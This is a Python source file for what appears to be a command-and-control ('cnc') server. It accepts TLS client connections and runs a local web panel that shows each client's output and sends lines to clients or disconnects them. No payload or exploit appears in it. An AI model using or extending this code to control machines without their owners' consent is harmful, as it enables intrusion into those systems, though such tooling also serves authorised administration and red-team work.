#!/usr/bin/env python
import cnc
import http
import json
import mimetypes
import os
import sys
import time

cnc_server=None
comets=[]
comet_timeout_ms=1000*60*5
max_comets=20

def millis():
	return int(round(time.time()*1000))

def onopen(client):
	global cnc_server
	print('['+str(time.asctime())+'] tcp open '+client.addr+' '+str(client.uid))
	service_comets(True)

def onclose(client):
	global cnc_server
	print('['+str(time.asctime())+'] tcp close '+client.addr+' '+str(client.uid))
	service_comets(True)

def onrecv(client):
	print('['+str(time.asctime())+'] tcp recv '+client.addr+' '+str(client.uid))
	service_comets()

def onsend(client):
	print('['+str(time.asctime())+'] tcp send '+client.addr+' '+str(client.uid))
	service_comets()

def service_comets(force=False):
	global cnc_server
	global comets
	global max_comets
	comet_clients=[]

	kill_counter=len(comets)-max_comets

	for comet in comets:
		client=comet[0]
		request=comet[1]

		if kill_counter>0:
			kill_counter-=1
			client.respond(429,'Too Many Requests')
			continue

		try:
			if client.closed:
				raise Exception('Dead')

			obj={}

			if request['method']=='updates':
				if not 'params' in request:
					request['params']={}

				obj['result']={}

				changed=force

				for uid in cnc_server.clients.keys():
					obj['result'][uid]={}
					obj['result'][uid]['chunks']=[]

					if uid in request['params']:
						last_count=int(request['params'][uid])

						if last_count<len(cnc_server.clients[uid].chunks):
							obj['result'][uid]['chunks']=cnc_server.clients[uid].chunks[last_count:]
							changed=True
					else:
						obj['result'][uid]['chunks']=cnc_server.clients[uid].chunks
						changed=True
					obj['result'][uid]['last_count']=len(cnc_server.clients[uid].chunks)

			if changed:
				client.respond(200,'OK',json.dumps(obj))
			else:
				comet_clients.append(comet)

		except Exception:
			if not client.closed:
				client.respond(400,'Bad Request')
	comets=comet_clients

def handler(client):
	global cnc_server
	global comets
	global comet_timeout_ms

	query_str=''
	if len(client.query_str)>0:
		query_str='?'+client.query_str

	print('['+str(time.asctime())+'] http '+client.addr+' '+client.method+' '+
		client.request+query_str)

	if client.method=='POST':
		try:
			obj={}
			request=json.loads(client.post_data)
			comet_request=False

			if request['method']=='updates':
				comets.append((client,json.loads(client.post_data),millis()+comet_timeout_ms))
				service_comets()
				comet_request=True

			elif request['method']=='kill':
				cnc_server.kill(request['params']['address'])

			elif request['method']=='write':
				cnc_server.send(request['params']['address'],request['params']['line'])

			else:
				obj={'error':'Unsupported method.'}

			if not comet_request:
				client.respond(200,'OK',json.dumps(obj))

		except Exception:
			client.respond(400,'Bad Request')

	elif client.method=='GET':
		try:
			if len(client.request)>0 and client.request[-1]=='/':
				client.request+='index.html'

			file_path='web/'+client.request

			if os.path.abspath(file_path).find(os.getcwd()+'/web/')!=0:
				raise Exception("Nope")

			mime=mimetypes.guess_type(file_path)
			if len(mime)>0:
				mime=mime[0]
			else:
				mime='text/plain'

			client.respond(200,'OK',open(file_path,'r').read(),mime)

		except Exception:
			client.respond(404,'Not Found')

	else:
		client.respond(405,'Method Not Allowed')

if __name__=='__main__':
	try:
		cnc_server=cnc.server_t('0.0.0.0',8080,"my.crt","my.key")
		cnc_server.onopen=onopen
		cnc_server.onclose=onclose
		cnc_server.onrecv=onrecv
		cnc_server.onsend=onsend
		http_server=http.server_t('127.0.0.1',8081,handler)

		while True:
			cnc_server.update()
			http_server.update()

			alive_comets=[]
			for comet in comets:
				if millis()>comet[2]:
					comet[0].respond(408,'Request Timeout')
				else:
					alive_comets.append(comet)
			comets=alive_comets

	except KeyboardInterrupt:
		exit(1)

	except Exception as error:
		print('Error - '+str(error))